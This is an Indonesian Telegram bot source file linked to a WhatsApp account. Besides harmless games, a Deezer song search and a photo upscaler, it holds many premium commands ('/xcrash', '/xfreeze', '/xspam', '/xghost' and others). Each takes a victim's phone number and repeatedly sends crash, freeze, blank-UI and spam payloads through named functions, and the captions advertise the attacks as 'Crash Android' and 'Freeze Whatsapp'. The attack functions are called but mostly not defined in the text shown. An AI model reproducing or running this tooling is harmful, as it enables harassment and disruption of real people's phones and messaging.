bot.command("oncmd", checkOwner, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (!args[1])
    return ctx.reply("⚠️ Contoh: /oncmd menu");

  const cmd = args[1].toLowerCase();

  if (!disabled.includes(cmd))
    return ctx.reply(`⚠️ /${cmd} tidak dalam daftar nonaktif.`);

  disabled = disabled.filter(c => c !== cmd);

  return ctx.reply(`✅ /${cmd} berhasil diaktifkan.`);
});

// ================= DISABLE LIST =================
bot.command("offcmdlist", checkOwner, (ctx) => {

  if (disabled.length === 0) {
    return ctx.reply(
`📋 OFFCMD LIST

✅ Tidak ada command yang dinonaktifkan`
    );
  }

  const list = disabled
    .map((c, i) => `• ${i + 1}. /${c}`)
    .join("\n");

  return ctx.reply(
`📋 OFFCMD LIST

🚫 Command nonaktif:
${list}

📊 Total: ${disabled.length}`
  );

});
///==== LOCK AND UNLOCK ALL CMD====\\\
let lockAllCmd = false;

// LOCK
bot.command("lockallcmd", checkOwner, (ctx) => {
  lockAllCmd = true;
  return ctx.reply("🔒 Semua command di blokir oleh Owner");
});

// UNLOCK
bot.command("unlockallcmd", checkOwner, (ctx) => {
  lockAllCmd = false;
  return ctx.reply("🔓 Semua command telah di buka dari blokiran oleh Owner");
});

// MIDDLEWARE
bot.use((ctx, next) => {
  const text = ctx.message && ctx.message.text ? ctx.message.text : "";

  if (text.startsWith("/lockallcmd") || text.startsWith("/unlockallcmd")) {
    return next();
  }

  if (lockAllCmd) {
    return ctx.reply("🔒 Command sedang di-lock.");
  }

  return next();
});
// ================= MIDDLEWARE BLOKIR =================
bot.use((ctx, next) => {
  if (!ctx.message?.text) return next();

  const cmd = ctx.message.text.split(" ")[0].replace("/", "").toLowerCase();

  if (disabled.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} sedang dinonaktifkan oleh owner.`);
  }

  return next();
});
// ========== 10 TOOLS SERU-SERUAN ==========

// 1. Cek Jodoh (random)
bot.command("jodoh", (ctx) => {
  const persen = Math.floor(Math.random() * 100) + 1;
  const status = persen > 70 ? "Cocok banget! 💖" : (persen > 40 ? "Bisa jadi 😊" : "Kurang cocok 😅");
  ctx.reply(`💘 *Cek Jodoh*\nKecocokan: ${persen}%\nStatus: ${status}`, { parse_mode: "Markdown" });
});

// 2. Ramalan Shio (random)
bot.command("shio", (ctx) => {
  const ramalan = ["Hoki besar 🍀", "Lumayan beruntung ✨", "Biasa aja 😶", "Kurang bagus 😕", "Sial dikit 🤣"];
  const random = ramalan[Math.floor(Math.random() * ramalan.length)];
  ctx.reply(`🐉 *Ramalan Shio hari ini:* ${random}`, { parse_mode: "Markdown" });
});

// 3. Tebak Angka (game)
let tebakAngka = {};
bot.command("tebak", (ctx) => {
  const userId = ctx.from.id;
  if (!tebakAngka[userId]) {
    tebakAngka[userId] = Math.floor(Math.random() * 10) + 1;
    return ctx.reply("🎲 *Tebak Angka (1-10)*\nKetik /tebak [angka]\nContoh: /tebak 5", { parse_mode: "Markdown" });
  }
  const args = ctx.message.text.split(" ");
  const tebakan = parseInt(args[1]);
  if (isNaN(tebakan)) return ctx.reply("Masukkan angka 1-10!");
  if (tebakan === tebakAngka[userId]) {
    ctx.reply("🎉 *Benar!* Selamat! 🎉\nKetik /tebak lagi untuk main baru.");
    delete tebakAngka[userId];
  } else {
    ctx.reply(`❌ Salah! Angka rahasianya bukan ${tebakan}. Coba lagi.`);
  }
});

bot.command('setch', checkOwner, (ctx) => {

  const args = ctx.message.text.split(' ').slice(1);

  if (!args[0]) {
    return ctx.reply('❌ Gunakan: /setch @ChannelLu');
  }

  JoinCh = args[0];

  ctx.reply(
    `✅ Channel diubah menjadi: ${JoinCh}\n` +
    `\n` +
    `jangan lupa adminin di ch lu bot nya biar ke detect user dh join atau belom yakk!!`
  );
});

// 4. Kata Motivasi random
bot.command("motivasi", (ctx) => {
  const quotes = [
    "✨ Jangan menyerah, hari ini berat besok mungkin indah.",
    "💪 Sukses dimulai dari keberanian untuk memulai.",
    "🌟 Percaya sama diri sendiri, itu kunci utama.",
    "🌱 Proses tidak akan mengkhianati hasil.",
    "🚀 Bermimpilah tinggi, lalu kejar!"
  ];
  const random = quotes[Math.floor(Math.random() * quotes.length)];
  ctx.reply(`💡 *Motivasi:* ${random}`, { parse_mode: "Markdown" });
});

// 5. Batu-gunting-kertas (suit)
bot.command("suit", (ctx) => {
  const pilihan = ["batu", "gunting", "kertas"];
  const user = ctx.message.text.split(" ")[1]?.toLowerCase();
  if (!user || !pilihan.includes(user)) return ctx.reply("Pilih: /suit batu | gunting | kertas");
  const botChoice = pilihan[Math.floor(Math.random() * 3)];
  let hasil = "";
  if (user === botChoice) hasil = "Seri 🤝";
  else if (
    (user === "batu" && botChoice === "gunting") ||
    (user === "gunting" && botChoice === "kertas") ||
    (user === "kertas" && botChoice === "batu")
  ) hasil = "Kamu menang! 🎉";
  else hasil = "Bot menang! 😭";
  ctx.reply(`✊ Kamu: ${user}\n🤖 Bot: ${botChoice}\n${hasil}`);
});

// 6. Cek kepribadian dari nama (random)
bot.command("kepribadian", (ctx) => {
  const sifat = ["Pemberani 🦁", "Pintar 🧠", "Baik hati 💖", "Lucu 😂", "Penyabar 🧘", "Kreatif 🎨"];
  const random = sifat[Math.floor(Math.random() * sifat.length)];
  ctx.reply(`🧠 *Kepribadianmu:* ${random}`, { parse_mode: "Markdown" });
});

// 7. Ramalan karir random
bot.command("karir", (ctx) => {
  const karir = ["Programmer 💻", "Pengusaha 🏢", "Dokter 🩺", "Guru 📚", "Artis 🎬", "Atlet ⚽"];
  const random = karir[Math.floor(Math.random() * karir.length)];
  ctx.reply(`💼 *Karir masa depanmu:* ${random}`, { parse_mode: "Markdown" });
});

// 8. Cek level ganteng/cantik (random)
bot.command("level", (ctx) => {
  const level = Math.floor(Math.random() * 100) + 1;
  let status = level > 80 ? "Level Dewa/ Dewi 😎" : (level > 50 ? "Cukup menawan 😊" : "Biasa saja 🤭");
  ctx.reply(`📊 *Level ketampanan/kecantikan:* ${level}%\n${status}`, { parse_mode: "Markdown" });
});

// 9. Tebak hari lahir (seru-seruan)
bot.command("harilahir", (ctx) => {
  const hari = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"];
  const random = hari[Math.floor(Math.random() * hari.length)];
  ctx.reply(`🎂 *Hari lahir versi random:* Kamu lahir hari ${random}. (Hanya hiburan)`, { parse_mode: "Markdown" });
});

// 10. Game lempar koin
bot.command("koin", (ctx) => {
  const hasil = Math.random() < 0.5 ? "Kepala 🪙" : "Ekor 💰";
  ctx.reply(`🪙 *Hasil lempar koin:* ${hasil}`, { parse_mode: "Markdown" });
});
// ========== PENCARIAN LAGU (DEEZER) ==========
// Command: /lagu [judul lagu]

bot.command("lagu", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply("🎵 Cara pakai: /lagu [judul lagu]\nContoh: /lagu blur song 2", { parse_mode: "Markdown" });
  }

  const status = await ctx.reply(`🔍 *Mencari: ${query}`, { parse_mode: "Markdown" });

  try {
    const res = await fetch(`https://api.deezer.com/search?q=${encodeURIComponent(query)}&limit=1`);
    const data = await res.json();

    if (!data.data || data.data.length === 0) {
      return ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, `❌ Lagu "${query}" tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const track = data.data[0];
    const judul = track.title;
    const artis = track.artist.name;
    const preview = track.preview;
    const cover = track.album.cover_medium;
    const link = track.link;

    // Hapus pesan "mencari"
    await ctx.telegram.deleteMessage(ctx.chat.id, status.message_id).catch(() => {});

    // Kirim cover + info
    if (cover) {
      await ctx.replyWithPhoto(cover, {
        caption: `🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`,
        parse_mode: "Markdown"
      });
    } else {
      await ctx.reply(`🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`, { parse_mode: "Markdown" });
    }

    // Kirim audio preview jika ada
    if (preview && preview !== "null") {
      await ctx.replyWithAudio(preview, {
        title: judul,
        performer: artis,
        caption: "🎧 *Preview 30 detik*"
      });
    } else {
      await ctx.reply("⚠️ *Preview audio tidak tersedia untuk lagu ini.*", { parse_mode: "Markdown" });
    }

  } catch (err) {
    console.error(err);
    await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, "❌ Terjadi kesalahan. Coba lagi nanti.", { parse_mode: "Markdown" }).catch(() => {
      ctx.reply("❌ Terjadi kesalahan. Coba lagi nanti.");
    });
  }
});
// ========== FOTO JADI HD (UPSCALE) ==========
// Gunakan API PicWish (gratis, tanpa API key)

bot.command("hd", async (ctx) => {
  // Cek apakah user reply ke sebuah foto
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply(
`📸 CARA PAKAI:\n1. Kirim foto ke bot\n2. Reply foto tersebut\n3. Ketik /hd\n\n✨ *Hasil: Foto akan di-upgrade ke resolusi lebih tinggi & lebih tajam!`
    );
  }

  const statusMsg = await ctx.reply("⏳ *Memproses foto...* (bisa makan waktu 10-20 detik mohon bersabar...)");

  try {
    // Ambil file ID foto dengan resolusi tertinggi
    const photo = ctx.message.reply_to_message.photo;
    const fileId = photo[photo.length - 1].file_id;
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download foto ke buffer
    const response = await fetch(fileUrl);
    const buffer = Buffer.from(await response.arrayBuffer());

    // Upload ke PicWish API
    const form = new FormData();
    form.append("image_file", buffer, { filename: "image.jpg" });
    form.append("type", "clean"); // "clean" = umum, "face" = wajah
    form.append("scale_factor", "4"); // 4 = 4x lebih besar

    const upscaleRes = await fetch("https://api.picwish.com/v1/photo-enhancer", {
      method: "POST",
      body: form,
    });

    const result = await upscaleRes.json();
    if (!result.image_url) throw new Error();

    // Kirim hasil
    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id);
    await ctx.replyWithPhoto(result.image_url, {
      caption: "✅ *Foto berhasil ditingkatkan kualitasnya!*",
    });
  } catch (err) {
    console.error("HD Error:", err);
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      "❌ Gagal memproses foto. Coba foto lain atau coba lagi nanti."
    );
  }
});
// ================= CONNECT ================= //
bot.command("connect", checkOwner, async (ctx) => {
  try {
    if (!sock) {
      return ctx.reply("❌ Socket belum siap. Silahkan ketik /restart lalu setelah itu melakukan /connect kembali.");
    }

    if (isWhatsAppConnected && sock.user) {
      return ctx.reply("✅ WhatsApp sudah terhubung.");
    }

    if (global.pairingMessage) {
      return ctx.reply("⚠️ Pairing masih aktif, tunggu dulu.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply("🪧 Example:\n/connect 628xxxx");
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "");

    
    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    
    if (phoneNumber.length < 8 || phoneNumber.length > 15) {
      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/connect 628xxxx");
    }

    await new Promise(r => setTimeout(r, 1000));

    const code = await sock.requestPairingCode(phoneNumber);
    if (!code) return ctx.reply("❌ Gagal ambil pairing code.");

    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

    const msg = await ctx.replyWithPhoto(
      "https://files.catbox.moe/tyqvf0.jpg",
      {
        caption:
`\`\`\`JavaScript
const NOMOR_PAIRING = ${phoneNumber}
const KODE_PAIRING = ${formattedCode}\`\`\`
`,
        parse_mode: "Markdown"
      }
    );

    global.pairingMessage = {
      chatId: msg.chat.id,
      messageId: msg.message_id
    };

    setTimeout(() => {
      global.pairingMessage = null;
    }, 60000);

  } catch (err) {
    console.log("Pairing error FULL:", err);
    global.pairingMessage = null;
    ctx.reply("❌ Gagal pairing, Coba lakukan /killsesi  lalu setelah itu melakukan /restart dan connect kembali!");
  }
});

// ================= KILL SESSION ================= //
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session berhasil dihapus, Silahkan ketik /restart lalu setelah itu /connect kembali untuk menghubungkan Sender atau Bot");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session ketik /restart lalu setelah itu killsesi kembali");
  }
});

bot.command("xcrash", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /xcrash 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    await ctx.replyWithPhoto(
      "https://files.catbox.moe/tyqvf0.jpg",
      {
        caption: `
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Crash Android
༄ Status - Success Sending
\`\`\`
`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Cek Target", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "4958642964181025908" }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let r = 0; r < 10; r++) {
        try {
          await kumpulanfunctionCrashUi(sock, target)
          await sleep(2000);
        } catch (err) {
          console.log("⚠️ Terjadi Error Pada Saat Menjalankan Command :", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi Error Saat Menjalankan Command");
}});

bot.command("xwick", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /xwick 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    await ctx.replyWithPhoto(
      "https://files.catbox.moe/tyqvf0.jpg",
      {
        caption: `
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Blank Ui
༄ Status - Success Sending
\`\`\`
`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Cek Target", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "4958642964181025908" }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let r = 0; r < 5; r++) {
        try {
          await kumpulanfunctionBlankUI(sock, target)
          await sleep(1000);
        } catch (err) {
          console.log("⚠️ Terjadi Error Pada Saat Menjalankan Command :", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi Error Saat Menjalankan Command");
}});

bot.command("xfreeze", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /xfreeze 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    await ctx.replyWithPhoto(
      "https://files.catbox.moe/tyqvf0.jpg",
      {
        caption: `
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Freeze Whatsapp
༄ Status - Success Sending
\`\`\`
`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Cek Target", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "4958642964181025908" }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let r = 0; r < 2; r++) {
        try {
          await kumpulanfunction(sock, target)
          await sleep(1200);
        } catch (err) {
          console.log("⚠️ Terjadi Error Pada Saat Menjalankan Command :", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi Error Saat Menjalankan Command");
}});
  
bot.command("xfc", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /xfc 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    await ctx.replyWithPhoto(
      "https://files.catbox.moe/tyqvf0.jpg",
      {
        caption: `
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Fc Click
༄ Status - Success Sending
\`\`\`
`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Cek Target", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "4958642964181025908" }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let r = 0; r < 1; r++) {
        try {
          await CrashMakLo(target)
          await sleep(1000);
        } catch (err) {
          console.log("⚠️ Terjadi Error Pada Saat Menjalankan Command :", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi Error Saat Menjalankan Command");
}});

bot.command("xsystem", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /xsystem 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    await ctx.replyWithPhoto(
      "https://files.catbox.moe/tyqvf0.jpg",
      {
        caption: `
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Blank System UI
༄ Status - Success Sending
\`\`\`
`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Cek Target", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "4958642964181025908" }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let r = 0; r < 10; r++) {
        try {
          await kupulanfuncblanknotif(sock, target)
          await sleep(5000);
        } catch (err) {
          console.log("⚠️ Terjadi Error Pada Saat Menjalankan Command :", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi Error Saat Menjalankan Command");
}});

bot.command("xdarkover", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /xdarkover 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    await ctx.replyWithPhoto(
      "https://files.catbox.moe/tyqvf0.jpg",
      {
        caption: `
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Freeze Blank Ui
༄ Status - Success Sending
\`\`\`
`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Cek Target", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "4958642964181025908" }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let r = 0; r < 10; r++) {
        try {
          await Kumpulanfunctionfreezeblank(sock, target)
          await sleep(4000);
        } catch (err) {
          console.log("⚠️ Terjadi Error Pada Saat Menjalankan Command :", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi Error Saat Menjalankan Command");
}});

bot.command("xspam", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /xspam 62xx"); 
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const username = ctx.from.username || ctx.from.first_name;
  const time = new Date().toLocaleTimeString("id-ID");

  await ctx.reply(
`
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Bebas Spam
༄ Status - Success Sending
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Cek Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "4956461073550017373" }
          ]
        ]
      }
    }
  );
  
  (async () => {
    try {
      for (let r = 0; r < 20; r++) {
        await kumpulanfunctionDELAY(sock, target)
        await sleep(300);
      }
    } catch (err) {
      console.error("Error High :", err);
    }
  })();
});

bot.command("xlz", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /xlz 62xx"); 
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const username = ctx.from.username || ctx.from.first_name;
  const time = new Date().toLocaleTimeString("id-ID");

  await ctx.reply(
`
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Bebas Spam
༄ Status - Success Sending
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Cek Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "4956461073550017373" }
          ]
        ]
      }
    }
  );
  
  (async () => {
    try {
      for (let r = 0; r < 25; r++) {
        await delayXinvisble(sock, target)
        await delayXinvisble(sock, target)
        await sleep(200);
      }
    } catch (err) {
      console.error("Error High :", err);
    }
  })();
});

bot.command("xbugs", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /xbugs 62xx"); 
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const username = ctx.from.username || ctx.from.first_name;
  const time = new Date().toLocaleTimeString("id-ID");

  await ctx.reply(
`
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Bebas Spam
༄ Status - Success Sending
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Cek Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "4956461073550017373" }
          ]
        ]
      }
    }
  );
  
  (async () => {
    try {
      for (let r = 0; r < 15; r++) {
        await Exec(sock, target)
        await VnXIsHere(sock, target)
        await sleep(600);
      }
    } catch (err) {
      console.error("Error High :", err);
    }
  })();
});

bot.command("xperma", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /xperma 62xx"); 
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const username = ctx.from.username || ctx.from.first_name;
  const time = new Date().toLocaleTimeString("id-ID");

  await ctx.reply(
`
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Freeze Bebas Spam
༄ Status - Success Sending
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Cek Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "4956461073550017373" }
          ]
        ]
      }
    }
  );
  
  (async () => {
    try {
      for (let r = 0; r < 10; r++) {
        await GabungCrasHidOne(sock, target)
        await Freeze(sock, target, useDelayMode = false)
        await GabungFungsi(sock, target)
        await sleep(1000);
      }
    } catch (err) {
      console.error("Error High :", err);
    }
  })();
});

bot.command("xshow", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /xshow 62xx"); 
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const username = ctx.from.username || ctx.from.first_name;
  const time = new Date().toLocaleTimeString("id-ID");

  await ctx.reply(
`
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Bebas Spam
༄ Status - Success Sending
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Cek Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "4956461073550017373" }
          ]
        ]
      }
    }
  );
  
  (async () => {
    try {
      for (let r = 0; r < 25; r++) {
        await VnXNewDelaySpamNotifAi(sock, target)
        await sleep(400);
      }
    } catch (err) {
      console.error("Error High :", err);
    }
  })();
});

bot.command("xpd", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /xpd 62xx"); 
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const username = ctx.from.username || ctx.from.first_name;
  const time = new Date().toLocaleTimeString("id-ID");

  await ctx.reply(
`
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Bebas Spam
༄ Status - Success Sending
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Cek Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "4956461073550017373" }
          ]
        ]
      }
    }
  );
  
  (async () => {
    try {
      for (let r = 0; r < 10; r++) {
        await XTVCrashAll(sock, target)
        await FREEZEinvisible(sock, target)
        await sleep(500);
      }
    } catch (err) {
      console.error("Error High :", err);
    }
  })();
});

bot.command("xflow", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /xflow 62xx"); 
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const username = ctx.from.username || ctx.from.first_name;
  const time = new Date().toLocaleTimeString("id-ID");

  await ctx.reply(
`
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Fc Click
༄ Status - Success Sending
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Cek Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "4956461073550017373" }
          ]
        ]
      }
    }
  );
  
  (async () => {
    try {
      for (let r = 0; r < 10; r++) {
        await CrashNenekLo(target);
        await sleep(500);
        await CrashBapakLo(target);
        await sleep(500);
      }
    } catch (err) {
      console.error("Error High :", err);
    }
  })();
});

bot.command("xover", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /xover 62xx"); 
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const username = ctx.from.username || ctx.from.first_name;
  const time = new Date().toLocaleTimeString("id-ID");

  await ctx.reply(
`
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Fc Click
༄ Status - Success Sending
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Cek Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "4956461073550017373" }
          ]
        ]
      }
    }
  );
  
  (async () => {
    try {
      for (let r = 0; r < 10; r++) {
        await FcMakLo(target);
        await sleep(500);
      }
    } catch (err) {
      console.error("Error High :", err);
    }
  })();
});

bot.command("xghost", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /xghost 62xx"); 
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const username = ctx.from.username || ctx.from.first_name;
  const time = new Date().toLocaleTimeString("id-ID");

  await ctx.reply(
`
\`\`\`JavaScript
⬡═―—⊱ [ GHOST OVER FLOW ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - Fc Click
༄ Status - Success Sending
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Cek Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "4956461073550017373" }
          ]
        ]
      }
    }
  );
  
  (async () => {
    try {
      for (let r = 0; r < 10; r++) {
        await CrashPay(sock, target);
        await sleep(500);
      }
    } catch (err) {
      console.error("Error High :", err);
    }
  })();
});

async function kumpulanfunction(sock, target) {
    for (let r = 0; r < 5; r++) {
          await VnXNewfrezeeHard(sock, target);
          await sleep(300)
          await sendAllMessages(sock, target)
          await sendButtonMessage(sock, target)
          await BlankFreezeChat(sock, target)
          await sleep(800)
          await freezestc(sock, target)
          await sleep(400)
          await VnXFrezeeChatNew(sock, target)
          await XTVcuy(sock, target);
          await sleep(600);
          await VnXNewBlankStcHard(sock, target);
          await sleep(600);
    }
}

